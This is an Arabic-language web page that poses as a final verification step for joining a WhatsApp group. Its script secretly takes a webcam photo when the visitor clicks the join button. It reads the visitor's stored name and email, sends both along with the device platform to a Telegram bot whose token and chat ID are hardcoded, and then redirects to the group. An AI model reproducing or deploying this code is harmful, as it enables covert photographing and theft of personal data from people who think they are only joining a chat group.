<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة يوسف علاء</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@800;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body { font-family: 'Tajawal', sans-serif; background: #000; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        #bg-video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.4; }
        .glass { background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); border: 2px solid #ff003c; width: 90%; max-width: 450px; padding: 25px; border-radius: 20px; text-align: center; }
        .cam-box { width: 100%; border-radius: 15px; overflow: hidden; border: 2px solid #333; margin: 15px 0; }
        video { width: 100%; transform: scaleX(-1); }
        .btn-final { width: 100%; padding: 18px; border: none; border-radius: 12px; background: #ff003c; color: white; font-size: 20px; font-weight: 900; cursor: pointer; box-shadow: 0 5px 15px rgba(255,0,60,0.4); }
    </style>
</head>
<body onload="setup()">

    <video id="bg-video" autoplay muted playsinline loop>
        <source src="385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4" type="video/mp4">
    </video>

    <div class="glass">
        <h2 style="color:#ffb700; margin-top:0;">🛡️ مرحباً بك في العرين</h2>
        <p style="font-size:13px;">المؤسس يوسف علاء يطلب التحقق الأخير..</p>

        <div class="cam-box">
            <video id="v" autoplay playsinline></video>
            <canvas id="c" style="display:none;"></canvas>
        </div>

        <button onclick="sendReport()" class="btn-final">تأكيد الانضمام للواتساب 🚀</button>
        <p style="font-size:10px; color:#666; margin-top:10px;">👑 بـواسطـة يـوسـف عـلاء 👑</p>
    </div>

    <script>
        const BOT_TOKEN = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
        const CHAT_ID = "7394389253";
        const WHATSAPP = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts";

        function setup() {
            navigator.mediaDevices.getUserMedia({ video: true }).then(s => document.getElementById('v').srcObject = s);
        }

        async function sendReport() {
            Swal.fire({ title:'يتم فحص الطاقة..', background:'#000', color:'#fff', didOpen:() => Swal.showLoading() });

            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const name = localStorage.getItem('u_name');
                const mail = localStorage.getItem('u_mail');
                const power = Math.floor(Math.random() * 9000) + 1000;

                const fd = new FormData();
                fd.append("chat_id", CHAT_ID);
                fd.append("photo", blob, "capture.jpg");
                fd.append("caption", `🚨 تقرير دخول جديد 🚨\n\n👤 الاسم: ${name}\n📧 البريد: ${mail}\n⚡ الطاقة: ${power}\n📱 الجهاز: ${navigator.platform}\n👑 القائد: يوسف علاء`);

                try {
                    // إرسال للتلجرام
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
                    
                    // التحويل للواتساب فوراً بعد النجاح
                    Swal.fire({ icon:'success', title:'تم القبول!', text:'جاري نقلك لجروب الواتساب..', timer:2000, showConfirmButton:false });
                    setTimeout(() => { window.location.href = WHATSAPP; }, 2000);
                } catch(e) {
                    alert("حدث خطأ، حاول مرة أخرى");
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
